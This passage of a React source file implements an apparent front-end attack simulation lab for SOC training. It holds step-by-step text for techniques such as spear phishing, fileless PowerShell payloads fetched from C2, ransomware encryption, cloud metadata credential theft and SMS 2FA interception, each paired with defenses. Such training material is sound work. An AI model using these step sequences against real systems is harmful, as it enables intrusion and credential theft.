          `[${timestamp}] What is happening: Artificially changing asset prices`,
          `[${timestamp}] Why it's critical: DeFi protocols rely on accurate prices`,
          `[${timestamp}] 🔍 Step 1: Identify target liquidity pool (e.g., Uniswap V2)`,
          `[${timestamp}] 🔍 Step 2: Execute large swap to imbalance pool`,
          `[${timestamp}] 🔍 Step 3: Trigger price oracle update with manipulated price`,
          `[${timestamp}] 🔍 Step 4: Create arbitrage opportunity in other protocols`,
          `[${timestamp}] 💡 Key Insight: AMMs calculate price from pool ratios`,
          `[${timestamp}] 💡 Attack Vector: Large trade changes pool ratio = changes price`,
          `[${timestamp}] 💡 Target: Protocols using single AMM as price source`,
          `[${timestamp}] 🛡️ Defense: Time-weighted average price (TWAP)`,
          `[${timestamp}] 🛡️ Defense: Multiple oracle sources (Chainlink, Band)`,
          `[${timestamp}] 🛡️ Defense: Price deviation limits and circuit breakers`,
          ''
        ];
      } else if (category === 'apt' && stepId === 'initial-access') {
        return [
          `[${timestamp}] 📖 DETAILED EXPLANATION: Spear Phishing Attack`,
          `[${timestamp}] What is happening: Targeted email attack with malicious attachment`,
          `[${timestamp}] Why it works: Exploits human psychology and trust`,
          `[${timestamp}] 🔍 Step 1: Reconnaissance - Research target organization`,
          `[${timestamp}] 🔍 Step 2: Craft convincing email with urgent business context`,
          `[${timestamp}] 🔍 Step 3: Attach malicious document (.docm with macros)`,
          `[${timestamp}] 🔍 Step 4: Send from spoofed or compromised email account`,
          `[${timestamp}] 💡 Key Insight: Human is often the weakest security link`,
          `[${timestamp}] 💡 Attack Vector: Social engineering + malicious macro`,
          `[${timestamp}] 💡 Target: Employees with access to sensitive systems`,
          `[${timestamp}] 🛡️ Defense: Email gateway with attachment scanning`,
          `[${timestamp}] 🛡️ Defense: Disable macros by default in Office`,
          `[${timestamp}] 🛡️ Defense: Regular security awareness training`,
          ''
        ];
      } else if (category === 'apt' && stepId === 'execution') {
        return [
          `[${timestamp}] 📖 DETAILED EXPLANATION: PowerShell Payload Execution`,
          `[${timestamp}] What is happening: Executing malicious code via PowerShell`,
          `[${timestamp}] Why it's dangerous: PowerShell is trusted Windows tool`,
          `[${timestamp}] 🔍 Step 1: Spawn PowerShell with suspicious parameters`,
          `[${timestamp}] 🔍 Step 2: Bypass execution policy restrictions`,
          `[${timestamp}] 🔍 Step 3: Download second-stage payload from C2`,
          `[${timestamp}] 🔍 Step 4: Execute payload directly in memory (fileless)`,
          `[${timestamp}] 💡 Key Insight: PowerShell allows fileless malware execution`,
          `[${timestamp}] 💡 Attack Vector: Living off the land technique`,
          `[${timestamp}] 💡 Target: Windows systems with PowerShell enabled`,
          `[${timestamp}] 🛡️ Defense: PowerShell script block logging`,
          `[${timestamp}] 🛡️ Defense: Constrained Language Mode (CLM)`,
          `[${timestamp}] 🛡️ Defense: Application whitelisting (AppLocker)`,
          ''
        ];
      } else if (category === 'ransomware' && stepId === 'file-encryption') {
        return [
          `[${timestamp}] 📖 DETAILED EXPLANATION: File Encryption Process`,
          `[${timestamp}] What is happening: Encrypting user files to demand ransom`,
          `[${timestamp}] Why it's devastating: Data becomes inaccessible`,
          `[${timestamp}] 🔍 Step 1: Enumerate target files (documents, images, databases)`,
          `[${timestamp}] 🔍 Step 2: Generate strong encryption key (AES-256)`,
          `[${timestamp}] 🔍 Step 3: Encrypt files and change extensions`,
          `[${timestamp}] 🔍 Step 4: Securely delete original files`,
          `[${timestamp}] 💡 Key Insight: Modern ransomware uses strong encryption`,
          `[${timestamp}] 💡 Attack Vector: File system traversal + encryption`,
          `[${timestamp}] 💡 Target: Business-critical files and backups`,
          `[${timestamp}] 🛡️ Defense: Regular offline backups (3-2-1 rule)`,
          `[${timestamp}] 🛡️ Defense: File integrity monitoring (FIM)`,
          `[${timestamp}] 🛡️ Defense: Endpoint detection and response (EDR)`,
          ''
        ];
      } else if (category === 'cloud' && stepId === 'metadata-discovery') {
        return [
          `[${timestamp}] 📖 DETAILED EXPLANATION: Cloud Metadata Discovery`,
          `[${timestamp}] What is happening: Accessing cloud instance metadata service`,
          `[${timestamp}] Why it's dangerous: Metadata contains sensitive credentials`,
          `[${timestamp}] 🔍 Step 1: Identify cloud environment (AWS, Azure, GCP)`,
          `[${timestamp}] 🔍 Step 2: Query metadata service endpoint (169.254.169.254)`,
          `[${timestamp}] 🔍 Step 3: Extract IAM role credentials and tokens`,
          `[${timestamp}] 🔍 Step 4: Enumerate available permissions and resources`,
          `[${timestamp}] 💡 Key Insight: Metadata service provides temporary credentials`,
          `[${timestamp}] 💡 Attack Vector: SSRF or compromised EC2 instance`,
          `[${timestamp}] 💡 Target: Cloud instances with overprivileged IAM roles`,
          `[${timestamp}] 🛡️ Defense: IMDSv2 (session-based metadata service)`,
          `[${timestamp}] 🛡️ Defense: Least privilege IAM policies`,
          `[${timestamp}] 🛡️ Defense: Network segmentation and firewalls`,
          ''
        ];
      } else if (category === 'mobile' && stepId === 'sms-interception') {
        return [
          `[${timestamp}] 📖 DETAILED EXPLANATION: SMS Interception Attack`,
          `[${timestamp}] What is happening: Intercepting SMS messages for 2FA bypass`,
          `[${timestamp}] Why it's critical: SMS is common 2FA method`,
          `[${timestamp}] 🔍 Step 1: Request SMS permissions from user`,
          `[${timestamp}] 🔍 Step 2: Register broadcast receiver for SMS`,
          `[${timestamp}] 🔍 Step 3: Intercept 2FA codes from banking apps`,
          `[${timestamp}] 🔍 Step 4: Forward intercepted codes to attacker`,
          `[${timestamp}] 💡 Key Insight: SMS is inherently insecure`,
          `[${timestamp}] 💡 Attack Vector: Android permissions + social engineering`,
          `[${timestamp}] 💡 Target: Users with SMS-based 2FA`,
          `[${timestamp}] 🛡️ Defense: App-based 2FA (Google Authenticator)`,
          `[${timestamp}] 🛡️ Defense: Hardware security keys (FIDO2)`,
          `[${timestamp}] 🛡️ Defense: SMS permission monitoring`,
          ''
        ];
      } else if (category === 'iot' && stepId === 'credential-attack') {
        return [
          `[${timestamp}] 📖 DETAILED EXPLANATION: IoT Default Credential Attack`,
          `[${timestamp}] What is happening: Exploiting default IoT device passwords`,
          `[${timestamp}] Why it works: Many users never change default passwords`,
          `[${timestamp}] 🔍 Step 1: Scan for IoT devices (cameras, routers, sensors)`,
          `[${timestamp}] 🔍 Step 2: Identify device models and default credentials`,
          `[${timestamp}] 🔍 Step 3: Test common username/password combinations`,
          `[${timestamp}] 🔍 Step 4: Document successful logins for later use`,
          `[${timestamp}] 💡 Key Insight: IoT devices often have weak security`,
          `[${timestamp}] 💡 Attack Vector: Default credentials + network access`,
          `[${timestamp}] 💡 Target: Unmanaged IoT devices on network`,
          `[${timestamp}] 🛡️ Defense: Change default passwords immediately`,
          `[${timestamp}] 🛡️ Defense: Network segmentation (IoT VLAN)`,
          `[${timestamp}] 🛡️ Defense: Regular security audits of IoT devices`,
          ''
        ];
      }
      
      // Default generic explanation for any step
      return [
        `[${timestamp}] 📖 DETAILED EXPLANATION: ${step.name}`,
        `[${timestamp}] What is happening: ${step.description}`,
        `[${timestamp}] MITRE ATT&CK Technique: ${step.technique}`,
        `[${timestamp}] Severity Level: ${step.severity.toUpperCase()}`,
        ''
      ];
    };

    const newLogs = [
      `[${timestamp}] ═══════════════════════════════════════════════════════════`,
      `[${timestamp}] 🎯 ATTACK STEP: ${step.name.toUpperCase()}`,
      `[${timestamp}] 📋 MITRE ID: ${step.mitreId} | Technique: ${step.technique}`,
      `[${timestamp}] ⚠️  Severity: ${step.severity.toUpperCase()}`,
      `[${timestamp}] ⏱️  Duration: ${step.duration} seconds`,
      `[${timestamp}] ═══════════════════════════════════════════════════════════`,
      '',
      ...getDetailedExplanation(step),
      `[${timestamp}] 💻 TECHNICAL EXECUTION:`,
      `[${timestamp}] ─────────────────────────────────────────────────────────`,
      ...step.commands.map((cmd, idx) => [
        `[${timestamp}] 🔧 Command ${idx + 1}: ${cmd}`,
        `[${timestamp}] 📝 Purpose: ${step.expectedResults[idx] || 'Execute attack operation'}`
      ]).flat(),
      '',
      `[${timestamp}] 📊 EXPECTED RESULTS:`,
      `[${timestamp}] ─────────────────────────────────────────────────────────`,
      ...step.expectedResults.map((result, idx) => `[${timestamp}] ✅ Result ${idx + 1}: ${result}`),
      '',
      `[${timestamp}] 🚨 DETECTION RULES & ALERTS:`,
      `[${timestamp}] ─────────────────────────────────────────────────────────`,
      ...step.detectionRules.map((rule, idx) => `[${timestamp}] 🔍 Detection ${idx + 1}: ${rule}`),
      '',
      `[${timestamp}] 🎓 LEARNING OBJECTIVES:`,
      `[${timestamp}] ─────────────────────────────────────────────────────────`,
      ...step.learningPoints.map((point, idx) => `[${timestamp}] 📚 Learning ${idx + 1}: ${point}`),
      '',
      `[${timestamp}] 🏆 ATTACK STEP COMPLETED SUCCESSFULLY!`,
      `[${timestamp}] 📈 Step Score: ${step.severity === 'critical' ? '25' : step.severity === 'high' ? '20' : step.severity === 'medium' ? '15' : '10'} points`,
      `[${timestamp}] ═══════════════════════════════════════════════════════════`,
      ''
    ];

    setLogs(prev => [...prev, ...newLogs]);
    setCurrentStep(prev => prev + 1);
    setProgress(((currentStep + 1) / selectedScenario.steps.length) * 100);
    setScore(prev => prev + (step.severity === 'critical' ? 25 : step.severity === 'high' ? 20 : step.severity === 'medium' ? 15 : 10));

    toast({
      title: `${selectedScenario.name} - ${step.name}`,
      description: `${step.technique} (${step.mitreId})`,
      variant: step.severity === 'critical' || step.severity === 'high' ? "destructive" : "default",
    });

    if (currentStep + 1 >= selectedScenario.steps.length) {
      setIsRunning(false);
      setLogs(prev => [
        ...prev,
        `[${timestamp}] 🎉 SIMULATION COMPLETED!`,
        `[${timestamp}] Final Score: ${score + (step.severity === 'critical' ? 25 : step.severity === 'high' ? 20 : step.severity === 'medium' ? 15 : 10)}`,
        `[${timestamp}] All objectives achieved successfully!`,
        ''
      ]);
      
      toast({
        title: "Simulation Complete!",
        description: `${selectedScenario.name} finished successfully`,
        variant: "default",
      });
    }
  };

  const startSimulation = () => {
    setIsRunning(true);
    setIsPaused(false);
    setCurrentStep(0);
    setLogs([]);
    setProgress(0);
    setScore(0);
    
    const timestamp = new Date().toLocaleTimeString();
    setLogs([
      `[${timestamp}] 🚀 STARTING SIMULATION: ${selectedScenario.name}`,
      `[${timestamp}] Difficulty: ${selectedScenario.difficulty.toUpperCase()}`,
      `[${timestamp}] Duration: ${selectedScenario.duration}`,
      `[${timestamp}] Category: ${selectedScenario.category.toUpperCase()}`,
      `[${timestamp}] Objectives: ${selectedScenario.objectives.length} objectives to complete`,
      `[${timestamp}] Prerequisites checked: ${selectedScenario.prerequisites.join(', ')}`,
      '',
      `[${timestamp}] Simulation mode: ${simulationMode.toUpperCase()}`,
      `[${timestamp}] Initializing attack simulation...`,
      '─'.repeat(80),
      ''
    ]);
    
    toast({
      title: "Simulation Started",
      description: `${selectedScenario.name} attack simulation initiated`,
      variant: "default",
    });
  };

  const pauseSimulation = () => {
    setIsPaused(!isPaused);
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [...prev, `[${timestamp}] ${isPaused ? '▶️ RESUMED' : '⏸️ PAUSED'} simulation`]);
  };

  const stopSimulation = () => {
    setIsRunning(false);
    setIsPaused(false);
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [...prev, `[${timestamp}] 🛑 SIMULATION STOPPED by user`]);
  };

  const nextStep = () => {
    if (currentStep < selectedScenario.steps.length) {
      executeStep(selectedScenario.steps[currentStep]);
    }
  };

  const getCategoryIcon = (category: string) => {
    const icons = {
      apt: Skull,
      ransomware: Lock,
      insider: Users,
      phishing: Target,
      blockchain: Database,
      defi: Coins,
      cloud: Cloud,
      iot: Wifi,
      mobile: Smartphone
    };
    return icons[category as keyof typeof icons] || Target;
  };

  const getDifficultyColor = (difficulty: string) => {
    return {
      beginner: 'text-green-400',
      intermediate: 'text-yellow-400',
      advanced: 'text-red-400'
    }[difficulty] || 'text-gray-400';
  };

  return (
    <div className="w-full max-w-7xl mx-auto p-6 space-y-6">
      <div className="glass-panel cyber-border p-6">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h1 className="text-2xl font-orbitron text-cyan-400 mb-2">
              Interactive Attack Simulation Lab
            </h1>
            <p className="text-gray-300">
              Advanced cybersecurity training environment for SOC professionals
            </p>
          </div>
          <div className="flex items-center space-x-4">
            <Badge variant="outline" className="text-cyan-400">
              {scenarios.length} Scenarios Available
            </Badge>
            <Badge variant="outline" className="text-green-400">
              Frontend-Only
            </Badge>
          </div>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
          <TabsList className="grid w-full grid-cols-4">
            <TabsTrigger value="scenarios">Scenarios</TabsTrigger>
            <TabsTrigger value="simulation">Simulation</TabsTrigger>
            <TabsTrigger value="analytics">Analytics</TabsTrigger>
            <TabsTrigger value="learning">Learning</TabsTrigger>
          </TabsList>

          <TabsContent value="scenarios" className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {scenarios.map((scenario) => {
                const IconComponent = scenario.icon;
                return (
                  <Card 
                    key={scenario.id} 
                    className={`cursor-pointer transition-all duration-300 hover:scale-105 ${
                      selectedScenario.id === scenario.id ? 'ring-2 ring-cyan-400' : ''
                    }`}
                    onClick={() => setSelectedScenario(scenario)}
                  >
                    <CardHeader className="pb-3">
                      <div className="flex items-center justify-between">
                        <IconComponent className="w-8 h-8 text-cyan-400" />
                        <Badge 
                          variant="outline" 
                          className={getDifficultyColor(scenario.difficulty)}
                        >
                          {scenario.difficulty}
                        </Badge>
                      </div>
                      <CardTitle className="text-lg font-orbitron text-cyan-400">
                        {scenario.name}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm text-gray-300 mb-3">
                        {scenario.description}
                      </p>
                      <div className="flex flex-wrap gap-1 mb-3">
                        {scenario.tags.map(tag => (
                          <Badge key={tag} variant="secondary" className="text-xs">
                            {tag}
                          </Badge>
                        ))}
                      </div>
                      <div className="flex items-center justify-between text-sm">
                        <span className="text-gray-400">
                          <Clock className="w-4 h-4 inline mr-1" />
                          {scenario.duration}
                        </span>
                        <span className="text-gray-400">
                          {scenario.steps.length} steps
                        </span>
                      </div>
                    </CardContent>
                  </Card>
                );
              })}
            </div>

            <Card className="glass-panel">
              <CardHeader>
                <CardTitle className="font-orbitron text-cyan-400">
                  {selectedScenario.name} - Details
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h4 className="font-semibold text-cyan-400 mb-2">Objectives</h4>
                    <ul className="space-y-1 text-sm">
                      {selectedScenario.objectives.map((objective, idx) => (
                        <li key={idx} className="flex items-start">
                          <Target className="w-4 h-4 text-cyan-400 mr-2 mt-0.5" />
                          {objective}
                        </li>
                      ))}
                    </ul>
                  </div>
                  <div>
                    <h4 className="font-semibold text-cyan-400 mb-2">Prerequisites</h4>
                    <ul className="space-y-1 text-sm">
                      {selectedScenario.prerequisites.map((prereq, idx) => (
                        <li key={idx} className="flex items-start">
                          <BookOpen className="w-4 h-4 text-cyan-400 mr-2 mt-0.5" />
                          {prereq}
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="simulation" className="space-y-4">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <div className="lg:col-span-2 space-y-4">
                <Card className="glass-panel">
                  <CardHeader>
                    <div className="flex items-center justify-between">
                      <CardTitle className="font-orbitron text-cyan-400">
                        Simulation Console
                      </CardTitle>
                      <div className="flex items-center space-x-2">
                        <Select value={simulationMode} onValueChange={(value: 'automatic' | 'manual') => setSimulationMode(value)}>
                          <SelectTrigger className="w-32">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="automatic">Automatic</SelectItem>
                            <SelectItem value="manual">Manual</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-4">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-2">
                          <Badge variant="outline" className="text-cyan-400">
                            {selectedScenario.name}
                          </Badge>
                          <Badge variant="outline" className={getDifficultyColor(selectedScenario.difficulty)}>
                            {selectedScenario.difficulty}
                          </Badge>
                        </div>
                        <div className="flex items-center space-x-2 text-sm text-gray-400">
                          <Activity className="w-4 h-4" />
                          Score: {score}
                        </div>
                      </div>
                      
                      <Progress value={progress} className="h-2" />
                      
                      <div className="flex flex-wrap gap-2">
                        {selectedScenario.steps.map((step, index) => (
                          <Badge
                            key={step.id}
                            variant={index < currentStep ? "default" : index === currentStep ? "destructive" : "secondary"}
                            className={`transition-all duration-500 ${
                              index === currentStep && isRunning && !isPaused ? "animate-pulse" : ""
                            }`}
                          >
                            {step.name}
                          </Badge>
                        ))}
                      </div>
                      
                      <div className="flex items-center space-x-2">
                        <Button
                          onClick={startSimulation}
                          disabled={isRunning}
                          className="bg-green-600 hover:bg-green-500"
                        >
                          <Play className="w-4 h-4 mr-2" />
                          Start Simulation
                        </Button>
                        
                        {isRunning && (
                          <>
                            <Button
                              onClick={pauseSimulation}
                              variant="outline"
                            >
                              {isPaused ? <Play className="w-4 h-4 mr-2" /> : <Square className="w-4 h-4 mr-2" />}
                              {isPaused ? 'Resume' : 'Pause'}
                            </Button>
                            
                            <Button
                              onClick={stopSimulation}
                              variant="destructive"
                            >
                              <Square className="w-4 h-4 mr-2" />
                              Stop
                            </Button>
                          </>
                        )}
                        
                        {simulationMode === 'manual' && currentStep < selectedScenario.steps.length && (
                          <Button
                            onClick={nextStep}
                            disabled={!isRunning || !isPaused}
                            variant="outline"
                          >
                            <SkipForward className="w-4 h-4 mr-2" />
                            Next Step
                          </Button>
                        )}
                      </div>
                    </div>
                  </CardContent>
                </Card>
                
                <Card className="glass-panel">
                  <CardHeader>
                    <CardTitle className="font-orbitron text-cyan-400 flex items-center">
                      <Terminal className="w-5 h-5 mr-2" />
                      Attack Simulation Logs
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <ScrollArea className="h-96 w-full">
                      <div className="bg-[var(--cyber-navy)] rounded p-4 text-sm font-code cyber-border">
                        {logs.length === 0 ? (
                          <div className="text-gray-500 text-center py-8">
                            No simulation running. Select a scenario and click "Start Simulation" to begin.
                          </div>
                        ) : (
                          logs.map((log, idx) => (
                            <div 
                              key={idx} 
                              className={`${
                                log.includes('===') ? 'text-cyan-400 font-bold' : 
                                log.includes('🚨') ? 'text-red-400' : 
                                log.includes('✓') ? 'text-green-400' : 
                                log.includes('📚') ? 'text-blue-400' : 
                                log.includes('🎉') ? 'text-yellow-400 font-bold' : 
                                'text-gray-300'
                              } leading-relaxed`}
                            >
                              {log}
                            </div>
                          ))
                        )}
                      </div>
                    </ScrollArea>
                  </CardContent>
                </Card>
              </div>
              
              <div className="space-y-4">
                <Card className="glass-panel">
                  <CardHeader>
                    <CardTitle className="font-orbitron text-cyan-400">
                      Current Step Details
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {currentStep < selectedScenario.steps.length ? (
                      <div className="space-y-3">
                        <div>
                          <h4 className="font-semibold text-cyan-400">
                            {selectedScenario.steps[currentStep].name}
                          </h4>
                          <p className="text-sm text-gray-300">
                            {selectedScenario.steps[currentStep].description}
                          </p>
                        </div>
                        <div>
                          <Badge variant="outline" className="text-cyan-400">
                            {selectedScenario.steps[currentStep].mitreId}
                          </Badge>
                          <Badge variant="outline" className="ml-2">
                            {selectedScenario.steps[currentStep].technique}
                          </Badge>
                        </div>
                        <div>
                          <span className="text-xs text-gray-400">Severity: </span>
                          <Badge 
                            variant={selectedScenario.steps[currentStep].severity === 'critical' ? 'destructive' : 'secondary'}
                          >
                            {selectedScenario.steps[currentStep].severity}
                          </Badge>
                        </div>
                      </div>
                    ) : (
                      <div className="text-center py-4">
                        <Trophy className="w-12 h-12 text-yellow-400 mx-auto mb-2" />
                        <p className="text-sm text-gray-300">
                          {currentStep === 0 ? 'Ready to start simulation' : 'Simulation completed!'}
                        </p>
                      </div>
                    )}
                  </CardContent>
                </Card>
                
                <Card className="glass-panel">
                  <CardHeader>
                    <CardTitle className="font-orbitron text-cyan-400">
                      Simulation Stats
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-3">
                      <div className="flex justify-between">
                        <span className="text-sm text-gray-400">Progress</span>
                        <span className="text-sm font-semibold">{Math.round(progress)}%</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-sm text-gray-400">Steps Completed</span>
                        <span className="text-sm font-semibold">{currentStep}/{selectedScenario.steps.length}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-sm text-gray-400">Current Score</span>
                        <span className="text-sm font-semibold text-cyan-400">{score}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-sm text-gray-400">Mode</span>
                        <span className="text-sm font-semibold">{simulationMode}</span>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="analytics" className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              <Card className="glass-panel">
                <CardHeader>
                  <CardTitle className="font-orbitron text-cyan-400">
                    Scenario Categories
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2">
                    {Object.entries(scenarios.reduce((acc, scenario) => {
                      acc[scenario.category] = (acc[scenario.category] || 0) + 1;
                      return acc;
                    }, {} as Record<string, number>)).map(([category, count]) => (
                      <div key={category} className="flex justify-between items-center">
                        <span className="text-sm capitalize">{category}</span>
                        <Badge variant="outline">{count}</Badge>
                      </div>
                    ))}
                  </div>
                </CardContent>
              </Card>

              <Card className="glass-panel">
                <CardHeader>
                  <CardTitle className="font-orbitron text-cyan-400">
                    Difficulty Distribution
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2">
                    {Object.entries(scenarios.reduce((acc, scenario) => {
                      acc[scenario.difficulty] = (acc[scenario.difficulty] || 0) + 1;
                      return acc;
                    }, {} as Record<string, number>)).map(([difficulty, count]) => (
                      <div key={difficulty} className="flex justify-between items-center">
                        <span className={`text-sm capitalize ${getDifficultyColor(difficulty)}`}>
                          {difficulty}
                        </span>
                        <Badge variant="outline">{count}</Badge>
                      </div>
                    ))}
                  </div>
                </CardContent>
              </Card>

              <Card className="glass-panel">
                <CardHeader>
                  <CardTitle className="font-orbitron text-cyan-400">
                    MITRE ATT&CK Coverage
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2">
                    <div className="flex justify-between items-center">
                      <span className="text-sm">Total Techniques</span>
                      <Badge variant="outline">
                        {new Set(scenarios.flatMap(s => s.steps.map(step => step.mitreId))).size}
                      </Badge>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm">Total Steps</span>
                      <Badge variant="outline">
                        {scenarios.reduce((acc, s) => acc + s.steps.length, 0)}
                      </Badge>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm">Avg Steps/Scenario</span>
                      <Badge variant="outline">
                        {Math.round(scenarios.reduce((acc, s) => acc + s.steps.length, 0) / scenarios.length)}
                      </Badge>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          <TabsContent value="learning" className="space-y-4">
            <Card className="glass-panel">
              <CardHeader>
                <CardTitle className="font-orbitron text-cyan-400">
                  Learning Resources
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h4 className="font-semibold text-cyan-400 mb-3">Key Learning Points</h4>
                    <ul className="space-y-2 text-sm">
                      <li className="flex items-start">
                        <Brain className="w-4 h-4 text-cyan-400 mr-2 mt-0.5" />
                        Understanding attack vectors and techniques
                      </li>
                      <li className="flex items-start">
                        <Shield className="w-4 h-4 text-cyan-400 mr-2 mt-0.5" />
                        Identifying detection and prevention methods
                      </li>
                      <li className="flex items-start">
                        <Eye className="w-4 h-4 text-cyan-400 mr-2 mt-0.5" />
                        Recognizing attack patterns and IOCs
                      </li>
                      <li className="flex items-start">
                        <Network className="w-4 h-4 text-cyan-400 mr-2 mt-0.5" />
                        Network security monitoring techniques
                      </li>
                    </ul>
                  </div>
                  <div>
                    <h4 className="font-semibold text-cyan-400 mb-3">Recommended Study Areas</h4>
                    <ul className="space-y-2 text-sm">
                      <li className="flex items-start">
                        <Code className="w-4 h-4 text-cyan-400 mr-2 mt-0.5" />
                        MITRE ATT&CK Framework
                      </li>
                      <li className="flex items-start">
                        <Database className="w-4 h-4 text-cyan-400 mr-2 mt-0.5" />
                        Threat Intelligence Analysis
                      </li>
                      <li className="flex items-start">
                        <AlertTriangle className="w-4 h-4 text-cyan-400 mr-2 mt-0.5" />
                        Incident Response Procedures
                      </li>
                      <li className="flex items-start">
                        <Zap className="w-4 h-4 text-cyan-400 mr-2 mt-0.5" />
                        Security Automation & Orchestration
                      </li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}

export default SimulatedAPTChain
